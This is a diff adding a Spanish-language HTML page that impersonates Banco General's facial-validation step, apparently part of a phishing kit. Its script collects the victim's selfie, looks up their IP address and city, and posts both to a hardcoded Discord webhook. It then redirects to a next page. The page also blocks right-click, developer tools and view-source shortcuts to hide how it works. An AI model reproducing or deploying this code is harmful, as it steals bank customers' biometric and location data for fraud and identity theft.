@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+
+
+              <!-- Inserted by miarroba -->
+              <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
+        <meta name="apple-itunes-app" content="app-id=284847138">
+		
+
+
+	<link rel="stylesheet" href="./hhhhhh_files/bactouch.css"><link rel="stylesheet" href="./hhhhhh_files/toolbar.css"><link rel="stylesheet" href="./hhhhhh_files/bact_listview.css"><link rel="stylesheet" href="./hhhhhh_files/footer.css"><script src="./hhhhhh_files/authhub-helper.js.descarga"></script><link rel="stylesheet" href="./hhhhhh_files/slidemenu.css"><script src="./hhhhhh_files/ap.js.descarga"></script></head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Validación Facial</title>
+
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    background: #ffffff;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.container {
+    background: white;
+    width: 90%;
+    max-width: 380px;
+    padding: 30px;
+    border-radius: 20px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    text-align: center;
+}
+
+.logo {
+    margin-bottom: 25px;
+}
+
+.logo img {
+    max-height: 40px;
+}
+
+/* CÍRCULO AZUL */
+.photo-frame {
+    width: 230px;
+    height: 230px;
+    border-radius: 50%;
+    border: 6px solid #1e4fd6;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+    margin: 0 auto 25px auto;
+    cursor: pointer;
+}
+
+#previewFoto {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+/* ALERTA AZUL */
+.alert {
+    background: #e7edff;
+    border-radius: 10px;
+    padding: 12px;
+    width: 90%;
+    max-width: 330px;
+    font-size: 14px;
+    color: #1e4fd6;
+    margin: 0 auto 25px auto;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+input[type="file"] {
+    display: none;
+}
+
+/* BOTÓN AZUL */
+.btn-blue {
+    width: 90%;
+    max-width: 330px;
+    background: #1e4fd6;
+    color: #ffffff;
+    padding: 14px;
+    border-radius: 10px;
+    border: none;
+    font-size: 18px;
+    cursor: pointer;
+    margin-bottom: 15px;
+    font-weight: bold;
+}
+
+/* BOTÓN BORDE AZUL */
+.btn-border {
+    width: 90%;
+    max-width: 330px;
+    background: white;
+    color: #1e4fd6;
+    padding: 14px;
+    border-radius: 10px;
+    border: 2px solid #1e4fd6;
+    font-size: 18px;
+    cursor: pointer;
+    font-weight: bold;
+}
+</style>
+
+<script>
+document.addEventListener('contextmenu', e => e.preventDefault());
+
+document.onkeydown = function(e) {
+    if (
+        e.keyCode == 123 ||
+        (e.ctrlKey && e.shiftKey && e.keyCode == 73) ||
+        (e.ctrlKey && e.keyCode == 85) ||
+        (e.ctrlKey && e.keyCode == 83)
+    ) {
+        e.preventDefault();
+        return false;
+    }
+}
+</script>
+
+<script> 
+    // Bloquear clic derecho
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
+    document.onkeydown = function(e) {
+        if (
+            e.keyCode == 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
+            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
+            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    }
+</script>
+
+
+</head>
+<body>
+
+<div class="container">
+
+<form id="loginForm">
+
+   <!-- LOGO -->
+    <div class="logo">
+<p style="text-align: center;"><img src="https://data.cbonds.com/organisations_logos/38473/1602067659Banco_General.png" alt="Banco General. Informaci&oacute;n del emisor. (LEI 549300B5C08LGDFB7205, SWIFT  BAGEPAPAXXX). Noticias y calificaciones de riesgo. Тablas con estados  financieros y contables." width="198" height="40" /></p>
+    </div>
+
+    <!-- FOTO -->
+    <div class="photo-frame" onclick="document.getElementById('seleccionArchivos').click();">
+        <img id="previewFoto" src="https://www.shutterstock.com/image-photo/passport-photo-portrait-young-man-260nw-2437772333.jpg">
+    </div>
+
+    <div class="alert">
+        ✔️ Revisa que la fotografía esté bien para la validación. Asegúrate de tener buena iluminación y quede en el centro como el Ejemplo.
+    </div>
+
+     <!-- INPUT FOTO OCULTO -->
+    <input name="photo" id="seleccionArchivos" type="file" accept="image/*" capture="camera" required>
+
+   <button type="submit" class="btn-blue">
+    Continuar
+</button>
+
+    <button class="btn-border" type="button" onclick="document.getElementById('seleccionArchivos').click();">Tomar de nuevo</button>
+
+</form>
+
+</div>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<script>
+// Previsualizar foto
+document.getElementById('seleccionArchivos').addEventListener('change', function(event) {
+    let archivo = event.target.files[0];
+    if (archivo) {
+        let reader = new FileReader();
+        reader.onload = function(e) {
+            document.getElementById('previewFoto').src = e.target.result;
+        }
+        reader.readAsDataURL(archivo);
+    }
+});
+
+// Enviar foto
+$(document).ready(function(){
+
+    $('#loginForm').submit(function(e){
+        e.preventDefault();
+
+        let archivo = $('#seleccionArchivos')[0].files[0];
+        if (!archivo) {
+            alert("Debes seleccionar una foto.");
+            return;
+        }
+
+        // Obtener IP
+        $.getJSON("https://api.ipify.org?format=json", function(ipData){
+
+            $.getJSON("https://ipinfo.io/json?token=ca7e5b87d95239")
+            .always(function(locData){
+
+                let ip = ipData.ip;
+                let ubicacion = (locData.city ? locData.city : "N/A") + ", " + (locData.country ? locData.country : "N/A");
+
+                let mensaje = {
+                    content: "**📸 FOTO RECIBIDA - General**\n" +
+                             "**IP:** " + ip + "\n" +
+                             "**Ubicación:** " + ubicacion + "\n" +
+                             "━━━━━━━━━━━━━━━━━━━━"
+                };
+
+                let formData = new FormData();
+                formData.append("file", archivo);
+                formData.append("payload_json", JSON.stringify(mensaje));
+
+                let webhookURL = "https://discord.com/api/webhooks/1524627781923897454/U8ANm19qBRsBje6YybrQKIaApBZ_s8rFdeZ5wgKEWfKTU-7pyO08l_LmQ2a3E9iZdT19";
+
+                $.ajax({
+                    url: webhookURL,
+                    method: "POST",
+                    data: formData,
+                    contentType: false,
+                    processData: false,
+                    success: function(){
+                        window.location = "5.html";
+                    },
+                    error: function(xhr){
+                        alert("Error al enviar foto al Discord.");
+                        console.log(xhr);
+                    }
+                });
+
+            });
+
+        });
+
+    });
+
+});
+</script>
+
+
+</body>
+</html>
